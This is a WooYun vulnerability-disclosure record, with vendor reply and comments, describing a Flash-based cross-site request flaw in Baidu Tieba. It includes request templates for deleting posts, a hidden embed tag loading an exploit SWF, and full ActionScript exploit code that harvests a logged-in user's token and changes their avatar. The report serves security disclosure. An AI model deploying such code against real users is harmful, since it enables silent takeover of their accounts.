{"id": 32225, "wybug_id": "wooyun-2015-0110065", "wybug_title": "百度贴吧XSS漏洞可控制已登录的贴吧账号（删帖、修改资料等）", "wybug_corp": "百度", "wybug_author": "EtherDream", "wybug_date": "2015-04-24 10:52", "wybug_open_date": "2015-06-08 12:58", "wybug_type": "xss跨站脚本攻击", "wybug_level": "高", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["敏感接口缺乏校验", "设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-24：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-08：\t细节向公众公开  简要描述： flash 反射提权。原理 http://drops.wooyun.org/papers/5732，这次演示的是第3个Demo的方式。 详细说明：  ### 原理问题 SWF：http://tieba.baidu.com/tb/static-itieba3/swf/itiebaVote.swf其中 baidu.vote.DataManager.requestPageData() 可以发请求。请求地址没写死，从 baidu.vote.enumerate.Constants.URL_VOTE_DETAIL 读取。（这个程序猿也够弱的，居然是用 var 定义的。如果是 const 那还改不了）每次请求前修改这个伪常量，就可发起跨站请求。同时，数据返回时调用了 PostVoteResult.fromString()，其中使用 JSON 解码。之前文中介绍过，即使不是 JSON 格式的数据，也可以通过全局异常捕获，接住解码时的错误，从中获取页面信息。### 利用http://tieba.baidu.com/ 可获取登录的账号名。http://tieba.baidu.com/home/profile?un={nick}  可获取 bdstoken、portrait删帖：POST http://tieba.baidu.com/f/commit/post/deletetbs={页面中可获取}kw={吧名}tid={帖子 id}user_name={nick}pid={页面中可获取}delete_my_post=1delete_my_thread=0is_vipdel=1is_finf=false修改头像http://himg.baidu.com/sys/corpupload?callback=A&coordX=0&coordY=0&coordW=200&coordH=200&psign={portrait}&picId=21751076141&bdstoken={bdstoken}...贴吧大部分接口都没验证 referer，所有都能成功。由于发帖需要验证码，搞成蠕虫有点麻烦。但控制了吧主账号的话，还是可以通过 HTTP 隧道的方式，人工发帖。（给吧主发个超链接，里面放些有趣的东西，让他多停留一会）   漏洞证明：  这里给个自动修改百度用户头像的 Demo：http://www.etherdream.com/hack/tieba-joke/exp.swf直接访问，或嵌套在任意页面：<embed src=\"//t.cn/RAY0j61\" allowScriptAccess=\"always\" style=\"position:absolute; top:-999px;\">即可修改已登录的百度账号头像。\npackage {\timport flash.display.*;\timport flash.events.*;\timport flash.net.*;\timport flash.system.*;\timport flash.utils.*;\t\tpublic class exp extends Sprite {\t\tprivate static const PATH:String =\t\t\t'baidu.vote.DataManager'\t\t\t\tprivate static const URL:String =\t\t\t'http://tieba.baidu.com/tb/static-itieba3/swf/itiebaVote.swf'\t\tprivate var clsExp:*;\t\tprivate var clsRes:*;\t\t\t\tpublic function exp() {\t\t\tSecurity.allowDomain('*');\t\t\tvar ld:Loader = new Loader();\t\t\tld.load(new URLRequest(URL));\t\t\taddChild(ld);\t\t\tvar tid:uint = setInterval(function() : void {\t\t\t\ttry {\t\t\t\t\tclsExp = ld.contentLoaderInfo.applicationDomain.getDefinition(PATH);\t\t\t\t\tclsRes= ld.contentLoaderInfo.applicationDomain.getDefinition('baidu.vote.enumerate.Constants');\t\t\t\t} catch(e:Error) {\t\t\t\t\treturn;\t\t\t\t}\t\t\t\tclearInterval(tid);\t\t\t\t\t\t\t\tready();\t\t\t}, 100);\t\t}\t\tprivate function load(url:String) : void {\t\t\t\t\t\tvar obj:* = clsExp.getInstance();\t\t\tobj.requestPageData({\t\t\t\t'r': 1,\t\t\t\t'voteId': 1,\t\t\t\t'tn': 1\t\t\t});\t\t\tclsRes.URL_VOTE_DETAIL = url + '#';\t\t\tobj.requestVoteDetail();\t\t}\t\t\t\tprivate function ready() : void {\t\t\tloaderInfo.uncaughtErrorEvents.addEventListener(UncaughtErrorEvent.UNCAUGHT_ERROR, function(e:UncaughtErrorEvent) : void {\t\t\t\tcomplete(e.error.text);\t\t\t});\t\t\tload('http://tieba.baidu.com/');\t\t}\t\t\t\t\t\tprivate var stat:int = 0;\t\tprivate var nick:String;\t\tprivate var bdstoken:String, portrait:String;\t\tprivate function complete(data:String) : void {\t\t\tvar arr:Array;\t\t\tswitch (stat) {\t\t\tcase 0:\t\t\t\t// get nick (from main page)\t\t\t\tarr = data.match(/\"name\": \"([^\"]+)/);\t\t\t\tif (arr) nick = arr[1];\t\t\t\tif (!nick) {\t\t\t\t\ttrace('fail get nick');\t\t\t\t\treturn;\t\t\t\t}\t\t\t\ttrace('nick:', nick);\t\t\t\tload('http://tieba.baidu.com/home/profile?un=' + nick);\t\t\t\tbreak;\t\t\t\t\t\tcase 1:\t\t\t\t// get token (from profile page)\t\t\t\tarr = data.match(/\\[PageData, '([^']+)/);\t\t\t\tif (arr) bdstoken = arr[1];\t\t\t\tif (!bdstoken) {\t\t\t\t\ttrace('fail get bdstoken');\t\t\t\t\treturn;\t\t\t\t}\t\t\t\ttrace('bdstoken:', bdstoken);\t\t\t\t// get portrait\t\t\t\tarr = data.match(/portrait\": \"([^\"]+)/);\t\t\t\tif (arr) portrait = arr[1];\t\t\t\tif (!portrait) {\t\t\t\t\ttrace('fail get portrait');\t\t\t\t\treturn;\t\t\t\t}\t\t\t\ttrace('portrait:', portrait);\t\t\t\t\t\t\t\t// new avatar\t\t\t\tvar url:String = 'http://himg.baidu.com/sys/corpupload?callback=A&coordX=0&coordY=0&coordW=200&coordH=200&psign=' + portrait + '&picId=21751076141&bdstoken=' + bdstoken;\t\t\t\tsendToURL(new URLRequest(url));\t\t\t\tbreak;\t\t\t}\t\t\tstat++;\t\t}\t}}\n\n\n   修复方案：  验证重要请求的 referer   版权声明：转载请注明来源 EtherDream@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-04-24 12:57 厂商回复： 感谢关注，已提交相关部门处理 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-24 10:53 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  好屌    \n     2015-04-24 11:05 |    \t\t小人物Reno \t\t\t( 普通白帽子  |\t\t\t        Rank:471 漏洞数:110        | X)\t\t \n  楼上太屌    \n     2015-04-24 11:05 |    \t\t于小木 \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:4        )\t\t \n  给跪    \n     2015-04-24 11:10 |    \t\tEtherDream \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:11        | JSHacker)\t\t \n  标题应该是CSRF    \n     2015-04-24 11:51 |    \t\tGrayTrack \t\t\t( 实习白帽子  |\t\t\t        Rank:75 漏洞数:14        | 灰色轨迹)\t\t \n  好屌    \n     2015-04-24 17:22 |    \t\tFriday \t\t\t( 实习白帽子  |\t\t\t        Rank:40 漏洞数:10        | 破土的小竹笋)\t\t \n  0.0楼主不就是百度的么    \n     2015-06-04 17:55 |    \t\t昌维 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | QQ：867597730，百度贴吧ID：昌维001)\t\t \n  楼主贴吧id是什么    \n     2015-06-08 13:07 |    \t\t明月影 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:8        | 学姿势，学思路。)\t\t \n  可是没有闪电啊……    \n     2015-06-08 13:09 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:84        | [code]心若没有栖息的地方，走到哪里都是在...)\t\t \n  我觉得这个应该18rank    \n     2015-06-09 07:33 |    \t\t小哲哥 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:2        | 关注网站安全)\t\t \n  表示没看懂    \n     2015-06-16 10:27 |    \t\tEtherDream \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:11        | JSHacker)\t\t \n  居然没修复。。。还是能 CSRF 到用户名和bdstoken。。。    \n     2015-06-17 00:26 |    \t\t昌维 \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:3        | QQ：867597730，百度贴吧ID：昌维001)\t\t \n  @EtherDream bdstoken能干啥用啊？求解    \n     2015-06-17 22:51 |    \t\tliyang \t\t\t( 路人 |\t\t\t        Rank:25 漏洞数:11        | 低调 沉默 守望)\t\t \n  还没修呢。。。    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}